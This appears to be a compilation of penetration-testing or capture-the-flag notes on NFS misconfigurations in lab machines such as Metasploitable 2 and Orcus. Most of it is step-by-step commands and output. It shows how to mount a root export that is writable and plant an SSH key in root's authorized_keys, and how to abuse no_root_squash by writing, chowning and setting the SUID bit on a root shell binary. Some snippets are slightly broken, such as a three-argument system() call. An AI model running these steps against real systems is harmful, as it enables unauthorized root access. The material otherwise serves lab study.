# SCENARIO: got NFS:
### Attack NFS and get root login

During the Vulnerability Scan of the 'Metasploitable 2' virtual machine in a previous post, we found the following misconfiguration in NFS Server.

The Root File System is exported in read/write mode.

```

root@kali:~# showmount -e 192.168.122.73
Export list for 192.168.122.73:/ *
```


Getting access to a system with a writeable filesystem like this is trivial. To do so (and because SSH is running), we will generate a new SSH key on our attacking system, mount the NFS export, and add our key to the root user account's authorized_keys file:

```

root@kali:~# mount -o nolock 192.168.122.73:/ /mnt
```

```

root@kali:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
```

```

root@kali:~# cat .ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys
```

```

root@kali:~# umount /mnt

```
```

root@kali:~# ssh 192.168.122.73
Last login: Mon May 25 07:46:57 2015 from :0.0 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
root@metasploitable:~#
```



-------------------------------------------------------------
## EXAMPLE 2 : (ORCUS)



proceed to list the mounts available to us on the target.
```
root@kali:~# showmount -e 192.168.110.102
Export list for 192.168.110.102:
/tmp *
```
Time to mount this on our testing machine.
```
root@kali:~# mkdir /tmp/orcus
root@kali:~# mount -t nfs 192.168.110.102:/tmp /tmp/orcus
root@kali:~# ls -lah /tmp/orcus
total 36K
drwxrwxrwt 9 root root 4.0K Mar 16 17:25 .
drwxrwxrwt 9 root root 4.0K Mar 20 09:25 ..
drwxrwxrwt 2 root root 4.0K Mar 16 17:23 .font-unix
drwxrwxrwt 2 root root 4.0K Mar 16 17:23 .ICE-unix
drwx------ 3 root root 4.0K Mar 16 17:23 systemd-private-1f6894c2997b4017a4f2b5ec650a3234-dovecot.service-Qos2Dc
drwx------ 3 root root 4.0K Mar 16 17:23 systemd-private-1f6894c2997b4017a4f2b5ec650a3234-systemd-timesyncd.service-IslOZP
drwxrwxrwt 2 root root 4.0K Mar 16 17:23 .Test-unix
drwxrwxrwt 2 root root 4.0K Mar 16 17:23 .X11-unix
drwxrwxrwt 2 root root 4.0K Mar 16 17:23 .XIM-unix
```
So - we've mounted the /tmp directory on the target. Who is nfs running as on the target?
```
ps aux | grep nfs
root      1402  0.0  0.0      0     0 ?        S<   09:34   0:00 [nfsd4_callbacks]
root      1405  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
root      1407  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
root      1408  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
root      1409  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
root      1410  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
root      1411  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
root      1415  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
root      1416  0.0  0.0      0     0 ?        S    09:34   0:00 [nfsd]
www-data  2873  0.0  0.1   3028   848 ?        S    10:38   0:00 grep nfs
```
And what is our nfs config?
```
cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#        to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/tmp *(rw,no_root_squash)
```
Awesome - so we can chmod and chown to our hearts content.

I upload a very simple program that will set our gid and uid, and execute /bin/bash to /tmp/shell.c
```
#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
   setgid(0);
   setuid(0);
   system("/bin/bash", argv, envp);
   return 0;
}
```
I proceed to compile the program.
```
gcc -o shell shell.c
shell.c:3:1: warning: return type defaults to 'int' [-Wimplicit-int]
main( int argc, char ** argv, char ** envp )
^
shell.c: In function 'main':
shell.c:7:2: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
 system("/bin/bash", argv, envp);
 ^
```
From our testing machine, and via the nfs mount, I chown the shell binary to root, and set the suid and sgid bits.
```
root@kali:/tmp/orcus# chown root:root shell
root@kali:/tmp/orcus# chmod +s shell
```
Finally, I execute the program on the target.
```
ls -lah
total 48K
drwxrwxrwt  9 root     root     4.0K Mar 16 10:40 .
drwxr-xr-x 24 root     root     4.0K Oct 30 23:05 ..
drwxrwxrwt  2 root     root     4.0K Mar 16 09:34 .ICE-unix
drwxrwxrwt  2 root     root     4.0K Mar 16 09:34 .Test-unix
drwxrwxrwt  2 root     root     4.0K Mar 16 09:34 .X11-unix
drwxrwxrwt  2 root     root     4.0K Mar 16 09:34 .XIM-unix
drwxrwxrwt  2 root     root     4.0K Mar 16 09:34 .font-unix
-rwsr-sr-x  1 root     root     7.3K Mar 16 10:40 shell
-rw-r--r--  1 www-data www-data  139 Mar 16 10:40 shell.c
drwx------  3 root     root     4.0K Mar 16 09:34 systemd-private-4fdc5fc8b7114fac9e9b67df64887946-dovecot.service-oJ1cF2
drwx------  3 root     root     4.0K Mar 16 09:34 systemd-private-4fdc5fc8b7114fac9e9b67df64887946-systemd-timesyncd.service-YXlVEN
./shell
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
Great stuff - let's grab our last flag.



## 3
### Port 111 — rpcbind 2–4 (RPC #100000)


As RPC is enabled lets run rpcinfo
```
root@kali:~# rpcinfo 192.168.1.39
```

As NFS is enabled lets see the mounts that are exported by the machine.
```
root@kali:/tmp# showmount --exports 192.168.1.39
Export list for 192.168.1.39:
/tmp *
```
Game Plan is to upload a SUID C Shell for /bin/bash to /tmp/ using our meterpreter session. Then mount /tmp to our local machine. Change the owner of SUID C Shell to root and assign sticky bit to it.
```

int main(void){
setresuid(0, 0, 0);
system("/bin/bash");
}
```

In Meterpreter
```

meterpreter > upload /root/Desktop/B2R/root_shell.c .
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Orcus:/tmp$ gcc root_shell.c -o root_shell
gcc root_shell.c -o root_shell

root_shell.c: In function 'main':
root_shell.c:2:8: warning: implicit declaration of function 'setresuid' [-Wimplicit-function-declaration]
setresuid(0, 0, 0);
^
root_shell.c:3:8: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
system("/bin/bash");
^
www-data@Orcus:/tmp$
```

In Kali:
```

root@kali:/tmp# showmount --exports 192.168.1.39
Export list for 192.168.1.39:
/tmp *
root@kali:/tmp# mkdir /tmp/nfs
root@kali:/tmp# mount -t nfs 192.168.1.39:/tmp /tmp/nfs
root@kali:/tmp# cd /tmp/nfs/
root@kali:/tmp/nfs# ls
root_shell    systemd-private-c53749e4f3cb470f818a594058f9877a-dovecot.service-l8pWgR
root_shell.c  systemd-private-c53749e4f3cb470f818a594058f9877a-systemd-timesyncd.service-bvrpCD
root@kali:/tmp/nfs# ./root_shell
root@kali:/tmp/nfs# chown root:root root_shell
root@kali:/tmp/nfs# chmod 4777 root_shell
root@kali:/tmp/nfs# ls -la
total 56
drwxrwxrwt 9 root     root      4096 May 18 18:18 .
drwxrwxrwt 8 root     root     12288 May 18 18:22 ..
drwxrwxrwt 2 root     root      4096 May 18 11:05 .font-unix
drwxrwxrwt 2 root     root      4096 May 18 11:05 .ICE-unix
-rwsrwxrwx 1 root     root      7392 May 18 18:18 root_shell
-rw-r--r-- 1 www-data www-data    73 May 18 18:16 root_shell.c
drwx------ 3 root     root      4096 May 18 16:11 systemd-private-c53749e4f3cb470f818a594058f9877a-dovecot.service-l8pWgR
drwx------ 3 root     root      4096 May 18 11:05 systemd-private-c53749e4f3cb470f818a594058f9877a-systemd-timesyncd.service-bvrpCD
drwxrwxrwt 2 root     root      4096 May 18 11:05 .Test-unix
drwxrwxrwt 2 root     root      4096 May 18 11:05 .X11-unix
drwxrwxrwt 2 root     root      4096 May 18 11:05 .XIM-unix
root@kali:/tmp/nfs#
```
Getting root
```

www-data@Orcus:/tmp$ ./root_shell
./root_shell
root@Orcus:/tmp# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
